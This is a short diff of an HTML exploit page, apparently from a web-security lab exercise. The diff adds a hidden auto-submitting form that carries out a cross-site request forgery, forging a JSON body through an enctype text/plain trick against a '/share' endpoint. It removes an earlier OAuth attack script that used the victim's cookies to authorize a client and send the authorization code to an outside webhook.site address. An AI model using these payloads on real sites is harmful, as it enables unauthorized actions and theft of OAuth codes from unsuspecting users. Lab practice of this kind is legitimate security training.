@@ -5,28 +5,12 @@
 </head>
 <body>
 
+<form id="csrf" action="http://ptl-f68d361f-db5c2afe.libcurl.so/share" method="POST" enctype="text/plain">
+<input name='{"user":"a","id":0,"trash":"' value='"}' type='hidden'>
+</form>
+
 <script>
-	
-const CLIENT_ID = '1e392442fe4f63ccd06a8c60f6c047533e986ada24e65628e1f7f9d8b804779a';
-const CLIENT_SECRET = '3f983d2ae6993efc43075b0d4bf1ff7873ad1ab1d986a801bd979abba6f4be04';
-
-  // This is the initial pageload
-const authUrl = `http://authorization-ptl-929f8477-75deddee.libcurl.so/oauth/authorize?client_id=${CLIENT_ID}&redirect_uri=https%3A%2F%2Fwebhook.site%2F0f708da4-0fc2-4632-98f1-7de5e5df90b8&response_type=code&scope=`;
-fetch(
-  authUrl,
-  {
-    method: 'HEAD',
-    credentials: 'include',
-    mode: 'no-cors'
-  }
-).catch(err => {
-  throw err;
-}).then(() => {
-  // We can't read the auth code on the redirect due to the same-origin policy.
-  // However, it shouldn't matter because the app is now authorized and will redirect automatically the next time.
-  window.location = authUrl;
-});
-
+document.getElementById('csrf').submit();
 </script>
 
 </body>
